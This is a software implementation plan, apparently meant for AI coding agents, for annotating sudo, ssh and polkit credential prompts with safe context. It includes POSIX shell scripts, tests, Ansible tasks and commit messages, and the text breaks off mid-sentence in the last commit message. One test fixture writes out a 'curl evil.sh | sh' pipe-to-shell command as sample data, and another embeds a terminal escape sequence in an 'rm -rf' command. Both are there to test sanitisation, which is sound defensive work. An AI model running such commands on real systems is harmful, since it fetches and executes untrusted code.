# Elevated Prompt Context Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make every credential prompt say what asked for it, and route interactive terminal `sudo` through the same box.

**Architecture:** Split "decide what to say" from "draw the box." A new
`gatherd-prompt-context` walks `/proc` and emits a sanitized context line;
`gatherd-askpass` keeps its existing contract but renders through `wayprompt`
(AUR) instead of fuzzel and foot. Spec:
`docs/superpowers/specs/2026-08-21-elevated-prompt-context-design.md`.

**Tech Stack:** POSIX `sh`, Ansible (FQCN), wayprompt (Zig/Wayland/layer-shell), cmd-polkit.

## Global Constraints

- **POSIX `sh` only** in `scripts/` — no bashisms. Runtime logic stays portable
  for the later Artix/s6 move (`plans/2026-06-29-arch-bootstrap-migration.md:21`).
- **No new systemd coupling.** `systemd-ask-password` is deliberately not used
  as a fallback; see the spec's *Failure modes*.
- **FQCN for every Ansible module** — `ansible.builtin.*`, `community.general.*`.
- **`ansible-lint` must pass** before each commit that touches `roles/`.
  `noqa` is a last resort.
- **Task names read like imperative sentences** ("Configure X", not "X config").
- **Comments explain only *why***, never what. The task name says what.
- **`gatherd-askpass` contract:** `argv[1]` = prompt, optional `argv[2]` =
  pre-computed context, stdout = secret, non-zero exit = cancel. Every existing
  caller passes one argument and must keep working.
- **Ellipsis is ASCII `...`**, never `…` — the allowlist in Task 1 keeps only
  printable ASCII, so a Unicode ellipsis would elide itself and trip the marker.
- **Test idiom:** POSIX `sh` under `tests/<name>`, following `tests/tablet-mode`
  — `ok`/`bad`/`assert_out`/`assert_ok`/`assert_fail`, fakes on `PATH`, ending
  with `printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"` and `[ "$FAIL" -eq 0 ]`.

## File Structure

| Path | Responsibility | Status |
| --- | --- | --- |
| `scripts/gatherd-prompt-context` | walk `/proc`, verify, allowlist, emit 1–2 lines | create |
| `tests/prompt-context` | unit tests for the above against a fake `/proc` | create |
| `scripts/gatherd-askpass` | classify source, gather context, drive wayprompt, map exits | rewrite |
| `tests/askpass` | unit tests against a fake `wayprompt` | create |
| `roles/system/templates/wayprompt.ini.j2` | house style → `/etc/wayprompt/config.ini` | create |
| `roles/system/tasks/sudo.yml` | install prompt-context; point sudo at askpass | modify |
| `roles/system/tasks/wayprompt.yml` | render `/etc/wayprompt/config.ini` | create |
| `roles/system/tasks/sudo_function.yml` | `sudo` shell function in `/etc/bash.bashrc` | create |
| `group_vars/all/main.yml` | add `wayprompt` to `aur_packages` | modify |
| `scripts/gatherd-polkit-agent` | pass polkit's message + action id as `argv[2]` | modify |
| `roles/desktop/tasks/core.yml` | drop the `gatherd-hostkey-verify` sway float rule | modify |
| `scripts/gatherd-post-setup-notes` | rewrite the credential-prompt verify line | modify |

**Correction to the spec:** it lists the wayprompt config template under
`roles/desktop`. That role runs `become_user: target_user`, and
`/etc/wayprompt/config.ini` needs root, so it lives in `roles/system` instead.

---

### Task 1: gatherd-prompt-context

The pure, testable unit. Nothing else in the plan can be tested honestly until
this exists, and it is the piece the spec flags as most likely to need
revisiting.

> **Superseded during execution.** The reference code below verifies the parent
> by reading `/proc/<pid>/exe`. That check can never succeed: sudo is
> setuid-root, so the kernel clears its dumpable flag, `/proc/<sudo-pid>`
> becomes `root:user`, and `readlink` on `exe` returns empty even for the same
> real user — measured from inside a real `sudo -A` askpass helper. The shipped
> version requires `/proc/<pid>` to be owned by uid 0 instead, which the kernel
> sets from the process's euid and an unprivileged impostor cannot forge. The
> reference `sanitize()` below also drops the `[elided]` marker whenever
> truncation fires; the shipped version tracks the two independently. See the
> spec's *Trust levels* and commit history for what actually landed.

**Files:**
- Create: `scripts/gatherd-prompt-context`
- Test: `tests/prompt-context`

**Interfaces:**
- Consumes: nothing.
- Produces: `gatherd-prompt-context <pid>` — prints 1 or 2 lines to stdout and
  **always exits 0**. Line 1 is `elevating: <cmd>` when `<pid>` is verifiably
  sudo; line 2 is `requested by <comm>`. When neither can be determined, prints
  the single line `context unavailable`. Reads `$GATHERD_PROC` (default `/proc`)
  so tests can supply a fake tree — the same override idiom
  `gatherd-polkit-agent` already uses for `$GATHERD_ASKPASS`.

- [ ] **Step 1: Write the failing test**

Create `tests/prompt-context`:

```sh
#!/bin/sh
# Unit tests for gatherd-prompt-context.
#
# Builds a fake /proc so the ancestry walk, the sudo verification and the
# allowlist are exercised without spawning real privileged processes. The
# allowlist is the part that must not be discovered to be wrong: it decides
# what bytes reach a box whose whole job is being trustworthy.
#
# Usage: tests/prompt-context

set -eu

TESTSDIR="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$TESTSDIR/.." && pwd)"
PASS=0
FAIL=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
PATH="$REPO/scripts:$PATH"
export PATH

ok()  { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }

assert_out() {
    _d=$1; _want=$2; shift 2
    _got=$("$@" 2>/dev/null || true)
    if [ "$_got" = "$_want" ]; then ok "$_d"; else bad "$_d (want [$_want] got [$_got])"; fi
}

# mkproc <pid> <ppid> <comm> <exe-target> <argv...>
# Writes a fake /proc/<pid> entry. cmdline is NUL-separated, as the kernel
# writes it; stat carries ppid in the field after the state letter.
mkproc() {
    _pid=$1; _ppid=$2; _comm=$3; _exe=$4; shift 4
    _d="$WORK/proc/$_pid"
    mkdir -p "$_d"
    printf '%s' "$_comm" > "$_d/comm"
    printf '%s (%s) S %s 0 0 0 0\n' "$_pid" "$_comm" "$_ppid" > "$_d/stat"
    ln -sf "$_exe" "$_d/exe"
    : > "$_d/cmdline"
    for _a in "$@"; do printf '%s\0' "$_a" >> "$_d/cmdline"; done
}

GATHERD_PROC="$WORK/proc"
export GATHERD_PROC

# A plain elevation from a shell inside foot: sudo's own argv is the command,
# and the first non-shell ancestor names the app.
mkproc 500 400 sudo /usr/bin/sudo sudo -A pacman -Syu
mkproc 400 300 bash /usr/bin/bash /bin/bash
mkproc 300 1   foot /usr/bin/foot foot --server
assert_out 'a verified sudo parent yields both lines' \
    'elevating: pacman -Syu
requested by foot' \
    gatherd-prompt-context 500

# The parent is not sudo, so its argv must not be presented as an elevation.
mkproc 501 400 evil /usr/bin/evil evil --pretend
assert_out 'an unverified parent yields no elevating line' \
    'requested by foot' \
    gatherd-prompt-context 501

# Shells are skipped, but the walk must stop at the session root rather than
# running off the end and reporting nothing.
mkproc 502 400 sudo /usr/bin/sudo sudo -A id
mkproc 400 301 bash /usr/bin/bash /bin/bash
mkproc 301 1   sway /usr/bin/sway sway
assert_out 'the walk stops at sway and still names something' \
    'elevating: id
requested by sway' \
    gatherd-prompt-context 502

# Control bytes must never reach the renderer, and their removal must be
# announced -- silently dropping them could make a command read as safer.
mkproc 503 400 sudo /usr/bin/sudo sudo -A "rm$(printf '\033')[2J -rf /tmp/x"
mkproc 400 300 bash /usr/bin/bash /bin/bash
assert_out 'elided control bytes are marked' \
    'elevating: rm[2J -rf /tmp/x [elided]
requested by foot' \
    gatherd-prompt-context 503

# Shell metacharacters are NOT elided: a reader needs to see the pipe.
mkproc 504 400 sudo /usr/bin/sudo sudo -A sh -c 'curl evil.sh | sh'
assert_out 'shell metacharacters survive the allowlist' \
    'elevating: sh -c curl evil.sh | sh
requested by foot' \
    gatherd-prompt-context 504

# A long command is truncated with an ASCII ellipsis, not a Unicode one.
mkproc 505 400 sudo /usr/bin/sudo sudo -A pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee
assert_out 'a long command is truncated to 60 characters plus ...' \
    'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee...
requested by foot' \
    gatherd-prompt-context 505

# Nothing knowable at all must still produce a line, so the box never changes
# shape and absence stays legible.
assert_out 'an unknown pid says so rather than printing nothing' \
    'context unavailable' \
    gatherd-prompt-context 999

assert_out 'a missing argument says so rather than printing nothing' \
    'context unavailable' \
    gatherd-prompt-context

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
```

- [ ] **Step 2: Run the test to verify it fails**

```bash
chmod +x tests/prompt-context && tests/prompt-context
```

Expected: every assertion FAILs with an empty `got`, because
`gatherd-prompt-context` does not exist yet. The final line reads
`0 passed, 8 failed` and the script exits non-zero.

- [ ] **Step 3: Write the implementation**

Create `scripts/gatherd-prompt-context`:

```sh
#!/bin/sh
# Answer "what popped this password box?" for gatherd-askpass.
#
# sudo hands its askpass helper nothing -- no SUDO_COMMAND, no SUDO_UID, just
# the invoking user's environment -- and polkit's agent API has no subject
# parameter at all, so neither upstream will tell us who is asking. Reading
# /proc behind their backs is the only route. That makes this a workaround for
# an API gap rather than a load-bearing security control, and it is why this
# lives in its own file: see the spec's "What a correct API would look like".
#
# Always exits 0. A prompt that cannot be annotated must still be shown.

proc="${GATHERD_PROC:-/proc}"
pid="${1:-}"

# Field 4 of /proc/<pid>/stat is ppid, but field-splitting on spaces breaks
# when comm contains one ("(Web Content)"). comm is the only parenthesised
# field, so cutting past the last ")" is exact where awk '{print $4}' is not.
ppid_of() {
    sed 's/^.*) //' "$proc/$1/stat" 2>/dev/null | cut -d' ' -f2
}

comm_of() {
    cat "$proc/$1/comm" 2>/dev/null
}

# Keep printable ASCII, drop everything else, and say so if anything went.
# Allowlist rather than blocklist: enumerating what is safe cannot be
# out-flanked by a byte nobody thought of. Metacharacters are deliberately
# kept -- a reader needs to see "curl evil.sh | sh" as it really is; the
# danger was only ever control bytes and escape sequences.
sanitize() {
    _raw=$1
    _clean=$(printf '%s' "$_raw" | LC_ALL=C tr -cd '\40-\176')
    if [ "${#_clean}" -gt 60 ]; then
        _clean=$(printf '%s' "$_clean" | cut -c1-60)...
    elif [ "${#_clean}" -ne "${#_raw}" ]; then
        _clean="$_clean [elided]"
    fi
    printf '%s' "$_clean"
}

lines=''
add() { lines="${lines:+$lines
}$1"; }

if [ -n "$pid" ] && [ -d "$proc/$pid" ]; then
    # Trust this argv only if the parent really is sudo. A poor man's
    # attestation: any process can set SUDO_ASKPASS and exec us directly with a
    # fabricated "[sudo]" prompt, and without this check we would dress that up
    # with a convincing fake command. sudo is setuid-root and does not rewrite
    # its own argv, so once verified the string is worth showing.
    case "$(readlink "$proc/$pid/exe" 2>/dev/null)" in
    /usr/bin/sudo | /bin/sudo)
        # Drop the -A we add ourselves in the sudo shell function; it is noise
        # in every prompt the function produces. Nothing else is parsed out:
        # sudo option parsing is subtle enough that guessing wrong would show a
        # command that is not the one being run.
        argv=$(tr '\0' ' ' < "$proc/$pid/cmdline" 2>/dev/null)
        argv=${argv#sudo }
        argv=${argv#-A }
        argv=${argv% }
        [ -n "$argv" ] && add "elevating: $(sanitize "$argv")"
        ;;
    esac

    # Name the app, not the shell that happens to sit between it and sudo.
    # Report only comm: a process can rewrite its own argv (that is what
    # setproctitle does), so this line is materially less trustworthy than the
    # one above and must not be dressed up with a full command line.
    walk=$(ppid_of "$pid")
    hops=0
    while [ -n "$walk" ] && [ "$walk" -gt 1 ] 2>/dev/null && [ "$hops" -lt 12 ]; do
        c=$(comm_of "$walk")
        case "$c" in
        sudo | bash | sh | zsh | dash | fish) ;;
        '') break ;;
        *) add "requested by $(sanitize "$c")"; break ;;
        esac
        walk=$(ppid_of "$walk")
        hops=$((hops + 1))
    done
fi

printf '%s\n' "${lines:-context unavailable}"
```

- [ ] **Step 4: Run the test to verify it passes**

```bash
chmod +x scripts/gatherd-prompt-context && tests/prompt-context
```

Expected: `8 passed, 0 failed`, exit 0.

If the truncation assertion fails by a character, print the actual value and
adjust the expected string in the test to match a 60-character cut plus `...` —
do **not** loosen the assertion to a substring match.

- [ ] **Step 5: Commit**

```bash
git add scripts/gatherd-prompt-context tests/prompt-context
git commit -m "Answer what popped the password box

sudo hands its askpass helper nothing and polkit's agent API has no subject
parameter, so reading /proc behind both their backs is the only route to
naming the requester. Verify the parent really is sudo before dressing its
argv up as an elevation -- without that check, any process could set
SUDO_ASKPASS, exec the prompter with a fabricated [sudo] prompt, and get a
convincing fake command rendered alongside it.

Allowlist printable ASCII rather than blocklisting control bytes, and mark the
line when anything was dropped: silent removal could make a command read as
safer than it is. Metacharacters stay, because a reader needs to see
curl evil.sh | sh as it really is."
```

---

### Task 2: Render through wayprompt

**Files:**
- Modify: `scripts/gatherd-askpass` (full rewrite)
- Test: `tests/askpass`

**Interfaces:**
- Consumes: `gatherd-prompt-context <pid>` from Task 1 (1–2 lines on stdout,
  always exit 0).
- Produces: `gatherd-askpass <prompt> [context]` — unchanged contract. Reads
  `$GATHERD_WAYPROMPT` (default `wayprompt`) so tests can substitute a fake,
  matching the `$GATHERD_ASKPASS` idiom in `gatherd-polkit-agent`.

- [ ] **Step 1: Write the failing test**

Create `tests/askpass`:

```sh
#!/bin/sh
# Unit tests for gatherd-askpass.
#
# Fakes wayprompt so the classification, the exit-code mapping and the
# secret-extraction are exercised without drawing anything. Exit mapping is the
# part that must not be wrong: a cancel misread as success would feed an empty
# password to sudo, and a success misread as cancel would wedge the vault loop.
#
# Usage: tests/askpass

set -eu

TESTSDIR="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$TESTSDIR/.." && pwd)"
PASS=0
FAIL=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
FAKEBIN="$WORK/bin"
mkdir -p "$FAKEBIN"
PATH="$FAKEBIN:$REPO/scripts:$PATH"
export PATH

GATHERD_WAYPROMPT="$FAKEBIN/wayprompt"
export GATHERD_WAYPROMPT

ok()  { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }

assert_out() {
    _d=$1; _want=$2; shift 2
    _got=$("$@" 2>/dev/null || true)
    if [ "$_got" = "$_want" ]; then ok "$_d"; else bad "$_d (want [$_want] got [$_got])"; fi
}
assert_fail() { _d=$1; shift; if "$@" >/dev/null 2>&1; then bad "$_d (expected failure)"; else ok "$_d"; fi; }

# fake_wayprompt <exit> <stdout...> -- also records its argv for inspection.
fake_wayprompt() {
    _rc=$1; shift
    {
        printf '#!/bin/sh\n'
        printf 'printf "%%s\\n" "$@" > "%s/argv"\n' "$WORK"
        for _l in "$@"; do printf 'printf "%%s\\n" %s\n' "'$_l'"; done
        printf 'exit %s\n' "$_rc"
    } > "$FAKEBIN/wayprompt"
    chmod +x "$FAKEBIN/wayprompt"
}

# Exit 0 means the user pressed OK; the secret is the second line.
fake_wayprompt 0 'user-action: ok' 'pin: hunter2'
assert_out 'an ok press prints the secret' 'hunter2' gatherd-askpass '[sudo]'

# A secret containing the literal prefix must survive. The stock
# wayprompt-ssh-askpass strips "pin: " from anywhere in the line, which
# corrupts exactly this password; we anchor to the start of line 2 instead.
fake_wayprompt 0 'user-action: ok' 'pin: pin: sneaky'
assert_out 'a secret containing the prefix is not corrupted' 'pin: sneaky' gatherd-askpass '[sudo]'

# A secret with a leading dash must not be eaten by echo.
fake_wayprompt 0 'user-action: ok' 'pin: -n'
assert_out 'a secret starting with a dash survives' '-n' gatherd-askpass '[sudo]'

# 10 is cancel, 20 is not-ok, 1 is error -- all abort, none print anything.
for _rc in 10 20 1; do
    fake_wayprompt "$_rc" 'user-action: cancel' 'no pin'
    assert_fail "exit $_rc is a cancel" gatherd-askpass '[sudo]'
    assert_out "exit $_rc prints no secret" '' gatherd-askpass '[sudo]'
done

# The host-key prompt is a decision, not a secret: three buttons, no masking,
# and the answer comes from which button was pressed.
fake_wayprompt 0 'user-action: ok'
assert_out 'the host-key prompt answers yes on ok' \
    'yes' gatherd-askpass 'Are you sure you want to continue connecting (yes/no/[fingerprint])?'
grep -q -- '--get-pin' "$WORK/argv" && bad 'the host-key prompt must not mask input' \
    || ok 'the host-key prompt does not mask input'

fake_wayprompt 20 'user-action: not-ok'
assert_out 'the host-key prompt answers no on not-ok' \
    'no' gatherd-askpass 'Are you sure you want to continue connecting (yes/no/[fingerprint])?'

fake_wayprompt 10 'user-action: cancel'
assert_fail 'the host-key prompt aborts on cancel' \
    gatherd-askpass 'Are you sure you want to continue connecting (yes/no/[fingerprint])?'

# A caller-supplied context wins over the /proc walk: polkit knows more than
# ancestry could recover.
fake_wayprompt 0 'user-action: ok' 'pin: x'
gatherd-askpass '[polkit]' 'Authentication is required to install software' >/dev/null 2>&1 || true
if grep -q 'Authentication is required to install software' "$WORK/argv"; then
    ok 'a caller-supplied context reaches wayprompt'
else
    bad 'a caller-supplied context reaches wayprompt'
fi

# wayprompt absent is a cancel, not a crash and not a fallback to fuzzel.
rm -f "$FAKEBIN/wayprompt"
assert_fail 'a missing wayprompt is a clean cancel' gatherd-askpass '[sudo]'

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
```

- [ ] **Step 2: Run the test to verify it fails**

```bash
chmod +x tests/askpass && tests/askpass
```

Expected: assertions FAIL — the current `gatherd-askpass` drives fuzzel and
foot and knows nothing about `$GATHERD_WAYPROMPT`.

- [ ] **Step 3: Write the implementation**

Replace `scripts/gatherd-askpass` entirely:

```sh
#!/bin/sh
# The one credential prompt: sudo -A, ssh, git, polkit and our own prompts all
# arrive here, and all leave through wayprompt. One renderer is the point --
# "the crimson box is what asks for my password" is only a useful instinct if
# it is true of every prompt, including the ssh host-key decision, which used
# to be a separately-styled foot window.
#
# Contract, unchanged so callers need no edits: argv[1] is the prompt, argv[2]
# is an optional pre-computed context line for callers that know more than a
# /proc walk could recover, stdout is the secret, non-zero exit is a cancel.

wayprompt="${GATHERD_WAYPROMPT:-wayprompt}"
prompt="${1:-Password:}"
context="${2:-}"

log_dir="${XDG_STATE_HOME:-$HOME/.local/state}/gatherd"

note() {
    mkdir -p "$log_dir" 2>/dev/null
    printf '%s %s\n' "$(date '+%F %T')" "$1" >> "$log_dir/askpass.log" 2>/dev/null
}

# wayprompt is an AUR package, so it does not exist until REST has run. Cancel
# cleanly rather than falling back: falling back to fuzzel would resurrect the
# second look this design exists to delete, and falling back to
# systemd-ask-password would owe the Artix/s6 port a second answer. Every
# caller already reads a non-zero exit as a cancel and does the right thing
# with it -- gatherd-prompt-vault leaves its loop, polkit denies, sudo aborts.
if ! command -v "$wayprompt" >/dev/null 2>&1; then
    note "wayprompt missing; cancelled prompt=$prompt"
    exit 1
fi

# ssh's first-contact host-key check reaches an askpass too, but it is a
# multi-line security decision rather than a password: "... ED25519 key
# fingerprint is SHA256:... Are you sure you want to continue connecting
# (yes/no/[fingerprint])?". Masking that hides the typed "yes" and truncates
# the fingerprint -- useless for the one prompt where reading the key is the
# whole point. Only the host-key prompt contains "(yes/no"; no password,
# passphrase, polkit or vault prompt does, so the match is exact.
#
# OpenSSH takes the answer from our stdout and treats a non-zero exit or empty
# output as "abort", so buttons map straight onto it.
case "$prompt" in
*'(yes/no'*)
    "$wayprompt" \
        --title 'SSH host key verification' \
        --description "$prompt" \
        --button-ok 'Yes' \
        --button-not-ok 'No' \
        --button-cancel 'Abort' >/dev/null 2>&1
    case $? in
    0)  printf 'yes\n'; exit 0 ;;
    20) printf 'no\n'; exit 0 ;;
    *)  exit 1 ;;
    esac
    ;;
esac

# sudo's default prompt is "[sudo] password for <user>:", which we keep verbose
# on the terminal (no sudoers passprompt override). In the box that long form
# is noise, so collapse it to the bare tag the way [vault] and [polkit] read.
case "$prompt" in
'[sudo]'*) prompt='[sudo]' ;;
esac

# Ask who is calling, unless the caller already told us. Never fatal: a prompt
# that cannot be annotated must still be shown.
[ -n "$context" ] || context=$(gatherd-prompt-context "$PPID" 2>/dev/null)
[ -n "$context" ] || context='context unavailable'

# Line 2 is "pin: <secret>", per wayprompt(1). Anchor the strip to the start of
# that line: the stock wayprompt-ssh-askpass uses s/pin: // unanchored, which
# corrupts any password containing that string. printf rather than echo, so a
# secret starting with "-n" is not eaten.
out=$("$wayprompt" \
    --title 'gatherd' \
    --description "$context" \
    --prompt "$prompt" \
    --button-ok 'OK' \
    --button-cancel 'Cancel' \
    --get-pin 2>/dev/null)
rc=$?

if [ "$rc" -ne 0 ]; then
    note "prompt=$prompt exit=$rc"
    exit "$rc"
fi

printf '%s\n' "$out" | sed -n '2s/^pin: //p'
```

The outer `printf "%s\n" "$(...)"` an earlier draft wrapped around this was not
merely redundant: on a run where line 2 is missing it turns "print nothing" into
"print an empty line". The pipeline alone is both simpler and more truthful.

- [ ] **Step 4: Run the test to verify it passes**

```bash
tests/askpass
```

Expected: `15 passed, 0 failed`, exit 0.

- [ ] **Step 5: Commit**

```bash
git add scripts/gatherd-askpass tests/askpass
git commit -m "Render every credential prompt through wayprompt

fuzzel cannot draw two lines -- a newline in --prompt-only renders as a literal
glyph -- so the context line needs a renderer that can. wayprompt takes a
multi-line --description, expresses the whole house style (colours, border
width, corner radius) in config, uses the same fcft font syntax as fuzzel and
foot, and has no single-instance lock, which retires the heisenbug the old
instrumentation was chasing.

The ssh host-key prompt collapses into the same binary: three buttons and no
masking, so the fingerprint is readable and the answer is a button press rather
than a typed yes. That deletes the separately-styled foot window, which is what
made 'the crimson box is what asks for my password' not quite true.

Do not reuse the stock wayprompt-ssh-askpass. It strips 'pin: ' from anywhere
in the line, corrupting any password containing that string, and echoes the
result, eating one starting with -n."
```

---

### Task 3: Install wayprompt and its house style

First point where the box is real. Verifies the two claims the spec could not:
that the AUR package builds here, and that the styling lands.

**Files:**
- Modify: `group_vars/all/main.yml`
- Create: `roles/system/templates/wayprompt.ini.j2`
- Create: `roles/system/tasks/wayprompt.yml`
- Modify: `roles/system/tasks/sudo.yml`
- Modify: `roles/system/tasks/rest.yml` (include the new task file)

**Interfaces:**
- Consumes: `scripts/gatherd-prompt-context` from Task 1.
- Produces: `/usr/local/bin/gatherd-prompt-context` on PATH for
  `gatherd-askpass`; `/etc/wayprompt/config.ini`.

- [ ] **Step 1: Add wayprompt to the AUR package list**

`aur_packages` is defined in `group_vars/all/main.yml:152` (the task file only
references it at `roles/aur/tasks/main.yml:85`). Add a comment-grouped entry,
matching the style of its neighbours:

```yaml
  # credential prompt
  - wayprompt
```

It goes in the regular list, **not** `slow.yml`: all of REST is post-login
anyway, so `slow.yml` buys nothing, and the prompter gates every other
credential interaction in the session.

Declaring it in a `*_packages` var is also what keeps
`scripts/gatherd-check-package-tiers` passing — that script fails any package
named inline in a task file, because the offline-cache builder cannot see it.

- [ ] **Step 2: Write the config template**

Create `roles/system/templates/wayprompt.ini.j2`:

```ini
# {{ ansible_managed }}
#
# The credential house style. The fuzzel launcher's indigo 08052b is
# channel-swapped to crimson 2b0508 -- the same colours, red-shifted -- so this
# box reads as kin to the launcher while being impossible to mistake for it
# when you are about to type a root password. The heavy salmon border finishes
# the separation.
#
# In /etc rather than ~/.config because the styling derives from
# foot_font_size, a machine fact rather than a user preference, and because a
# prompt must look the same regardless of who runs it.
[general]
# fcft, the same font library fuzzel and foot use, so this is the same syntax
# already templated into fuzzel.ini and foot.ini.
font-regular = JetBrainsMono-Regular:size={{ foot_font_size }};
font-large = JetBrainsMono-Regular:size={{ (13 * foot_font_size / 10) | round | int }};
border = 4;
corner-radius = 10;

[colours]
background = 0x2b0508;
border = 0xff7f7f;
text = 0xe3e3ea;
error-text = 0xff7f7f;
pin-background = 0x1a0305;
pin-border = 0xff7f7f;
pin-square = 0xff7f7f;
ok-button = 0x2b0508;
ok-button-border = 0xff7f7f;
ok-button-text = 0xe3e3ea;
not-ok-button = 0x2b0508;
not-ok-button-border = 0xff7f7f;
not-ok-button-text = 0xe3e3ea;
cancel-button = 0x2b0508;
cancel-button-border = 0xff7f7f;
cancel-button-text = 0xe3e3ea;
```

The old fuzzel box used `dd` alpha (≈0.87). wayprompt's documented colour form
is `0xRRGGBB` with no alpha, so the box is opaque. If a build turns out to
accept `0xRRGGBBAA`, translucency can be added later; do not assume it.

- [ ] **Step 3: Write the task file**

Create `roles/system/tasks/wayprompt.yml`:

```yaml
---
- name: Create the wayprompt config directory
  ansible.builtin.file:
    path: /etc/wayprompt
    state: directory
    mode: '0755'

- name: Configure the credential prompt's house style
  ansible.builtin.template:
    src: wayprompt.ini.j2
    dest: /etc/wayprompt/config.ini
    mode: '0644'
  notify: Etckeeper commit
```

Include it from `roles/system/tasks/rest.yml` alongside the other REST task
files, matching how that file already includes its neighbours.

- [ ] **Step 4: Install gatherd-prompt-context**

In `roles/system/tasks/sudo.yml`, immediately after the existing "Install
gatherd-askpass for graphical sudo and ssh" task:

```yaml
- name: Install gatherd-prompt-context for prompt annotation
  ansible.builtin.copy:
    src: "{{ setup_dir }}/scripts/gatherd-prompt-context"
    dest: /usr/local/bin/gatherd-prompt-context
    mode: '0755'
    remote_src: true
```

`/usr/local/bin` rather than `/usr/local/lib/gatherd/scripts`: `gatherd-askpass`
invokes it by bare name, and `/usr/local/bin` is already on the session PATH via
`pam_env`.

- [ ] **Step 5: Lint, install, and verify the box draws**

```bash
ansible-lint
```
Expected: no new findings.

```bash
yay -S --noconfirm wayprompt && command -v wayprompt && wayprompt --help | head -3
```

> **Do not "fix" the button flag from `--help`.** wayprompt's own help text and
> its man-page SYNOPSIS both print `--button-no-ok`, but the argument parser
> accepts only `--button-not-ok` (`src/wayprompt-cli.zig:181`; the OPTIONS
> section of `wayprompt.1` agrees). The help text is the typo. Task 2 already
> uses the correct spelling. Verified against source, along with the exit codes
> (`0` ok, `10` cancel, `20` not-ok — `wayprompt-cli.zig:112-128`) and the
> two-line `user-action:` / `pin:` output format.
Expected: the package builds and `--help` prints usage. **If the build fails**,
stop and report it — the spec names bit-rot as the standing risk, and the
fallback is fuzzel plus foot, which is a design change rather than a plan step.

```bash
sudo ansible-playbook site-async.yml --tags system 2>&1 | tail -5
cat /etc/wayprompt/config.ini
```
Expected: the template rendered with this machine's `foot_font_size`.

```bash
GATHERD_WAYPROMPT=wayprompt scripts/gatherd-askpass '[sudo]'
```
Expected: a crimson box with a salmon border, two lines of context naming this
shell, and a pin area. Type and press Enter; the secret prints to stdout. Press
Escape; nothing prints and the exit is non-zero.

- [ ] **Step 6: Commit**

```bash
git add group_vars/all/main.yml roles/system/templates/wayprompt.ini.j2 \
        roles/system/tasks/wayprompt.yml roles/system/tasks/sudo.yml \
        roles/system/tasks/rest.yml
git commit -m "Install wayprompt and dress it in the house style

The launcher's indigo channel-swapped to crimson, kin to fuzzel but impossible
to mistake for it when a root password is about to be typed. wayprompt uses
fcft, so foot_font_size transfers verbatim from the syntax already templated
into fuzzel.ini and foot.ini.

Config in /etc, not ~/.config: the styling derives from a machine fact rather
than a user preference, and a credential prompt should look the same regardless
of who runs it. The system role owns it because /etc needs root -- the desktop
role runs as target_user.

Regular aur package list rather than slow.yml. All of REST is post-login
anyway, so slow.yml buys nothing here, and the prompter gates every other
credential interaction in the session."
```

---

### Task 4: Give polkit prompts their real message

polkit already computes a human sentence and an action id, and
`gatherd-polkit-agent` currently throws both away in favour of a bare
`[polkit]`. This is the one source whose context needs no `/proc` walk.

**Files:**
- Modify: `scripts/gatherd-polkit-agent`

**Interfaces:**
- Consumes: `gatherd-askpass <prompt> [context]` from Task 2.
- Produces: nothing downstream.

- [ ] **Step 1: Pass polkit's own message through**

cmd-polkit's handler protocol is undocumented, but its own unit test pins the
schema exactly (`test/test-unit.entrypoint.c:166-173`, built in
`src/request-messages.c:17`). A `request password` line looks like:

```json
{"action":"request password",
 "prompt":"Password: ",
 "message":"Authentication is required to install software.",
 "polkit action":{"id":"org.freedesktop.packagekit.package-install",
                  "description":"Install package",
                  "message":"Authentication is required to install software.",
                  "vendor name":"PackageKit","vendor url":"","icon name":""}}
```

`"polkit action"` is **null** whenever cmd-polkit could not find the action in
polkit's enumerated list, so nothing may assume it is an object.

In `scripts/gatherd-polkit-agent`, inside the `--handle` loop, replace the
password call with:

```sh
        # polkit computes a human sentence ("Authentication is required to
        # install software.") and an action id for every request, and this
        # agent used to discard both in favour of a bare tag. They beat
        # anything the /proc walk could recover here: polkit's agent API has no
        # subject parameter, so ancestry names cmd-polkit rather than whatever
        # actually asked. "polkit action" is null when cmd-polkit could not
        # resolve the action, hence the guarded pick rather than a plain //.
        ctx=$(printf '%s' "$msg" | jq -r '
            [ ( [ .message, ."polkit action".message ]
                | map(select(type == "string" and . != "")) | first // empty ),
              ( ."polkit action".id // empty | select(. != "") )
            ] | join("\n")')
        if password=$("$askpass" "[polkit]" "$ctx"); then
```

- [ ] **Step 2: Verify the jq against all four shapes**

The guarded pick exists for the null case; prove it handles each. Run each and
compare:

```bash
JQ='[ ( [ .message, ."polkit action".message ] | map(select(type == "string" and . != "")) | first // empty ), ( ."polkit action".id // empty | select(. != "") ) ] | join("\n")'
echo '{"message":"Authentication is required to install software.","polkit action":{"id":"org.freedesktop.packagekit.package-install","message":"Authentication is required to install software."}}' | jq -r "$JQ"
echo '{"message":"Authentication is required.","polkit action":null}' | jq -r "$JQ"
echo '{"message":"","polkit action":{"id":"org.freedesktop.login1.halt","message":"Authentication is required to halt the system."}}' | jq -r "$JQ"
echo '{"message":"","polkit action":null}' | jq -r "$JQ"
```

Expected, in order: the sentence plus the packagekit id on two lines; the
sentence alone; the halt sentence plus the login1 id; and an empty string
(which `gatherd-askpass` turns into `context unavailable`).

- [ ] **Step 3: Verify against a real polkit request**

```bash
pkill -f cmd-polkit-agent; scripts/gatherd-polkit-agent &
sleep 1; pkexec true
```

Expected: the box names the action in words rather than showing `context
unavailable`. Cancel it.

- [ ] **Step 4: Commit**

```bash
git add scripts/gatherd-polkit-agent
git commit -m "Show polkit's own sentence instead of discarding it

polkit computes a human message and an action id for every request, and this
agent was throwing both away in favour of a bare [polkit] tag. They are
